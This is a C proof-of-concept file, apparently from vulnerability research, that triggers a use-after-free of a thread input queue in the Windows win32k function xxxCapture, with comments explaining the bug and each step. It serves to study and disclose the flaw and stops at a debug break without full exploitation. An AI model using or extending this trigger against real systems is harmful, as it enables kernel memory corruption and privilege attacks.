//
// Gil Dabah 2019
//
// Win32k Smash the Ref - POC #7 - xxxCapture PQ UAF
// Windows 10 x64
//

/*
A PQ UAF inside xxxCapture, after last ThreadUnlock.
It clears some status bit on a freed PQ.
Based on POC #6, now we know that this status bit is the menu mode capturing flag.

 This is the psuedo code we're attacking:
 xxxCapture(PWND someWnd)
 {
   PQ pq;

   ...

   if (thread in menu mode)
	lock capture state for thread

   ThreadLock(p);
   xxxSendMessage(p);
   pq = GetCurrentW32Thread()->pq;
   ThreadUnlock(p); // In the unlock of the window here we can free the used PQ!

   // This is always done even if not in menu state.
   pq->menu capture state flag = 0
}

In POC #3 we learned how to attack a PQ by using AttachThreadInput.
In POC #6 we learned how to attack xxxCapture.
This time it's a mix of the two, and actually much simpler code.

To see the UAF one should set a breakpoint on xxxCapture (making sure it's the right thread),
and walk over xxxSendMessageCallback call, and in the next ThreadUnlock the pq will be released,
and now the bit clearing is done on a freed memory.

Important note - Since thread-queues are allocated from a lookaside list, they may actually still be allocated in terms of !pool,
but logically they are freed and lookaside-list shaping could take place to make sure it's really really freed, but that's out of scope.
*/

#include <windows.h>
#include <stdio.h>

HWND g_hWnd1 = NULL; // This is the target zombie window.
HWND g_hWnd2 = NULL; // hWnd2 is the owner of hWnd1 from another thread.

DWORD CALLBACK threadproc2(LPVOID)
{
	// Create owner window.
	g_hWnd2 = CreateWindow("ScrollBar", NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	Sleep(1000000);

	return 0;
}

LRESULT CALLBACK shellHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HSHELL_WINDOWDESTROYED)
	{
		static int once = 1;
		if (once)
		{
			once = 0;

			printf("Step #4\n");
			// Destroy window.
			DestroyWindow(g_hWnd1);

			// Goes back to main's SetWindowLongPtr.
		}
	}
	return 0;
}

LRESULT CALLBACK targetWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg == WM_CAPTURECHANGED)
	{
		printf("Step #3\n");

		printf("Destroying window\n");
		// We destroy the old captured window and zombie reload it with an owner window from another thread.
		HHOOK hHook = SetWindowsHookEx(WH_SHELL, shellHookProc, NULL, GetCurrentThreadId());
		SetWindowLongPtr(g_hWnd1, GWLP_HWNDPARENT, (LONG_PTR)g_hWnd2);
		UnhookWindowsHookEx(hHook);

		printf("Step #5\n");
		// From here we will go back to xxxCapture, where it will unlock the previous capture window that we just destroyed.
		// Once xxxDestroyWindow is called, it will AttachThreadInput(FALSE) and actually detach and cause a reallocation of our thread's PQ.
		// xxxCapture will continue working with a bogus PQ, hence UAFing.
		DebugBreak();
	}
	return DefWindowProc(hWnd, msg, wParam, lParam);
}

int main()
{
	printf("Step #1\n");

	CreateThread(NULL, 0, threadproc2, NULL, 0, NULL);
	while (g_hWnd2 == NULL) Sleep(10);

	WNDCLASS cls = { 0 };
	cls.lpszClassName = "blaclass";
	cls.lpfnWndProc = targetWndProc;
	RegisterClass(&cls);

	g_hWnd1 = CreateWindow("blaclass", NULL, WS_OVERLAPPEDWINDOW, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	printf("HANDLE: %p\n", g_hWnd1);

	// Start by capturing our target window.
	SetCapture(g_hWnd1);

	// Just reset window capture, which will release the previous one.
	// And from here the flow begins in the call backs.
	// PQ UAF inside xxxCapture after ThreadUnlock.
	printf("Step #2\n");
	SetCapture(NULL);

	return 0;
}
